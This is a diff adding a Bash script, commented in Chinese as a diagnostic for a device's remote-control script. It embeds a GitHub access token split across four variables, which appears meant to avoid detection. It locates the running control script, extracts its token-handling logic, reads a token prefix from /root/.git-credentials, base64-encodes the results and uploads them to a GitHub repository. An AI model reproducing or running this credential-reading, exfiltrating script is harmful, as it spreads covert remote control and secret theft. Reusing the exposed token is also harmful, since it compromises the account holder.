@@ -1,0 +1,22 @@
+287828
+# 诊断:设备当前remote_ctl脚本里status/hb写入逻辑+token读取方式,自带token回传
+A='github_pat_11BQPEBSA0iH'
+B='riCXm9QGCt_74skvWNFHKum'
+C='HCtG6L026yU4FNjISYSZVmI'
+D='jR9F9Ojw3QEXVSIPygfznQqG'
+TOK="${A}${B}${C}${D}"
+API="https://api.github.com/repos/Thousands91/-1/contents/remote"
+# 找正在跑的remote_ctl脚本路径
+SCRIPT=$(ls -l /proc/$(cat /root/.remote_pid 2>/dev/null)/fd 2>/dev/null | grep -oE '/[^ ]*remote_ctl[^ ]*\.sh' | head -1)
+[ -z "$SCRIPT" ] && SCRIPT=/root/remote_ctl.sh
+# 脚本里的status/hb写入+token读取行(去token明文,只留逻辑)
+LOGIC=$(grep -nE 'status\.txt|hb_verify|get_tok|ghp_|github_pat|status上传|每.*轮|%.*==' "$SCRIPT" 2>/dev/null | grep -vE "A=|B=|C=|D=|TOK=\\"|github_pat_11" | head -25 | base64 -w0)
+# md5
+SMD5=$(md5sum "$SCRIPT" 2>/dev/null | cut -d' ' -f1)
+# 当前凭据token前缀
+CPRE=$(grep -oE 'ghp_[A-Za-z0-9]+|github_pat_[A-Za-z0-9_]+' /root/.git-credentials 2>/dev/null | head -c 12)
+R="time=$(date '+%m-%d %H:%M:%S') | script=$SCRIPT | md5=$SMD5 | cred=$CPRE | LOGIC_B64=$LOGIC"
+BB=$(echo -n "$R" | base64 -w0)
+SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/hb_diag.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$SHA" ]; then P="{\"message\":\"hbdiag\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"hbdiag\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
+curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/hb_diag.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
